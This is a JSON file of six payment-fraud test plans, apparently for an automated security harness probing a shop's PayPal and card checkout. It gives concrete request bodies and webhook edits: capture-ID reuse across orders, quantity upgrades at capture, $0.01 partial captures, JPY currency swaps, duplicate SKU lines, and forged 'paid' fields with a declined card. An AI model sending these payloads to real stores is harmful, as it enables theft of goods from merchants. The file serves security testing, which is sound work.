{
  "plans": [
    {
      "name": "Capture transplant to unpaid order",
      "idea": "The webhook handler may trust resource.custom_id/invoice_id to choose the shop order and may not globally deduplicate a capture ID or compare its $49 amount with that order's total, even though editing invalidates the original signature.",
      "expect": "A new order for 3 hoodies is fulfilled using the legitimate $49 capture that belonged to a different order.",
      "steps": [
        {
          "do": "request",
          "method": "POST",
          "path": "/api/paypal/orders",
          "body": {
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 3
              }
            ]
          },
          "headers": {},
          "times": 1,
          "together": false,
          "save": "a"
        },
        {
          "do": "webhook",
          "event": "PAYMENT.CAPTURE.COMPLETED",
          "edit": {
            "resource.custom_id": "{{a.body.orderId}}",
            "resource.invoice_id": "{{a.body.orderId}}",
            "resource.supplementary_data.related_ids.order_id": "{{a.body.id}}"
          },
          "signed": true,
          "times": 1
        }
      ]
    },
    {
      "name": "Capture-time item upgrade",
      "idea": "After genuine approval for one hoodie, the capture handler may trust items supplied in the capture request instead of the items stored when the PayPal order was created.",
      "expect": "Four hoodies are fulfilled although PayPal captured only the approved $49 for one hoodie.",
      "steps": [
        {
          "do": "buy",
          "tamper": {},
          "blockCapture": true,
          "save": "b"
        },
        {
          "do": "request",
          "method": "POST",
          "path": "/api/paypal/orders/{{b.paypalOrderId}}/capture",
          "body": {
            "orderId": "{{b.shopOrderId}}",
            "shopOrderId": "{{b.shopOrderId}}",
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 4
              }
            ],
            "totalCents": 4900,
            "amount": {
              "currency_code": "USD",
              "value": "49.00"
            }
          },
          "headers": {},
          "times": 1,
          "together": false
        }
      ]
    },
    {
      "name": "Partial-capture amount injection",
      "idea": "The capture endpoint may forward a client-supplied capture amount to PayPal, or treat any successful partial capture as full payment, instead of requiring capture of the stored order total.",
      "expect": "The $49 order is fulfilled after only $0.01 is captured.",
      "steps": [
        {
          "do": "buy",
          "tamper": {},
          "blockCapture": true,
          "save": "b"
        },
        {
          "do": "request",
          "method": "POST",
          "path": "/api/paypal/orders/{{b.paypalOrderId}}/capture",
          "body": {
            "amount": {
              "currency_code": "USD",
              "value": "0.01"
            },
            "amount_to_capture": {
              "currency_code": "USD",
              "value": "0.01"
            },
            "captureAmount": "0.01",
            "totalCents": 1,
            "final_capture": true
          },
          "headers": {},
          "times": 1,
          "together": false
        }
      ]
    },
    {
      "name": "Currency-code confusion",
      "idea": "The create-order handler may pass a client-selected currency to PayPal while fulfillment validation compares only the numeric value 49.00 and assumes USD.",
      "expect": "One hoodie is fulfilled for ¥49 instead of $49.00.",
      "steps": [
        {
          "do": "buy",
          "tamper": {
            "currency": "JPY",
            "currency_code": "JPY",
            "currencyCode": "JPY",
            "amount": {
              "currency_code": "JPY",
              "value": "49.00"
            },
            "purchase_units": [
              {
                "amount": {
                  "currency_code": "JPY",
                  "value": "49.00",
                  "breakdown": {
                    "item_total": {
                      "currency_code": "JPY",
                      "value": "49.00"
                    }
                  }
                },
                "items": [
                  {
                    "name": "Fogline Hoodie",
                    "sku": "FOG-HOODIE",
                    "quantity": "1",
                    "unit_amount": {
                      "currency_code": "JPY",
                      "value": "49.00"
                    }
                  }
                ]
              }
            ]
          },
          "blockCapture": false,
          "save": "b"
        }
      ]
    },
    {
      "name": "Duplicate SKU line split",
      "idea": "Pricing may deduplicate repeated SKUs with a map or first-match lookup while fulfillment iterates the raw item lines, causing PayPal to charge for one line but the warehouse to ship both.",
      "expect": "Two hoodies are shipped for a $49 payment for one hoodie.",
      "steps": [
        {
          "do": "buy",
          "tamper": {
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 1
              },
              {
                "sku": "FOG-HOODIE",
                "qty": 1
              }
            ]
          },
          "blockCapture": false,
          "save": "b"
        }
      ]
    },
    {
      "name": "Card route proof and price trust",
      "idea": "The separate card-checkout handler may trust client-supplied totals, paid/status fields, or a PayPal capture reference without binding that capture to this new order and amount, bypassing the declined card.",
      "expect": "Two hoodies are fulfilled without a new full payment, by reusing the legitimate $49 capture or a supplied $0.01 total despite the declined card.",
      "steps": [
        {
          "do": "request",
          "method": "POST",
          "path": "/api/checkout/card",
          "body": {
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 2,
                "priceCents": 1,
                "price": 0.01,
                "unit_amount": {
                  "currency_code": "USD",
                  "value": "0.01"
                }
              }
            ],
            "email": "shopper@example.com",
            "card": {
              "number": "4000000000000002",
              "exp": "12/39",
              "cvc": "123"
            },
            "totalCents": 1,
            "amount": {
              "currency_code": "USD",
              "value": "0.01"
            },
            "paid": true,
            "status": "fulfilled",
            "paymentStatus": "COMPLETED",
            "captureId": "{{legit.captureId}}",
            "paypalCaptureId": "{{legit.captureId}}",
            "paypalOrderId": "{{legit.paypalOrderId}}"
          },
          "headers": {},
          "times": 1,
          "together": false
        }
      ]
    }
  ]
}